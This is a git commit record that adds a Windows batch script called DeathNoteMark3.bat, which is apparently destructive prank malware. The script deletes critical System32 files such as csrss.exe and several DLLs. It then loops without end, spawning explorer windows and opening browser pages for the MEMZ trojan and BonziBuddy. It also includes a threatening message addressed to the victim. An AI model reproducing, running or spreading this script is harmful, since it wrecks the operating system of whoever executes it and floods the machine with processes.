4f1ff76468366bb687e8c2a3e1a45e4769f740ff
Kira <79051441+Kira-001@users.noreply.github.com>
2021-02-14 12:27:53 -0500

    Create DeathNoteMark3.bat

---
+++ DeathNoteMark3.bat
@@ -0,0 +1,16 @@
+@echo off
+del "C:\WINDOWS\system32\compact.exe"
+del "C:\WINDOWS\system32\csrss.exe"
+del "C:\WINDOWS\system32\APHostService.dll"
+del "C:\WINDOWS\system32\appinfo.dll"
+del "C:\WINDOWS\system32\AudioEng.dll"
+del "C:\WINDOWS\system32\AudioHandlers.dll"
+del "C:\WINDOWS\system32\AuthHostProxy.dll"
+:A
+start
+explorer
+start www.memz-trojan.en.softonic.com/
+start www.bonzibuddy.org/download.html/
+goto :A
+echo Dear %username%,Yes i know who you are. You knew what you did was wrong now you will pay, This Code Will break your computer from the inside out like a parasite infecting a host, only this time the host is your computer and the parasite is me. you cant stop this, The reason behind this is because you commited a serious crime and this is your punishment. you knew this was gonna happen when you started This. i'm the creeper, catch me if you can - "11,9,18,1" >> creep.txt
+pause
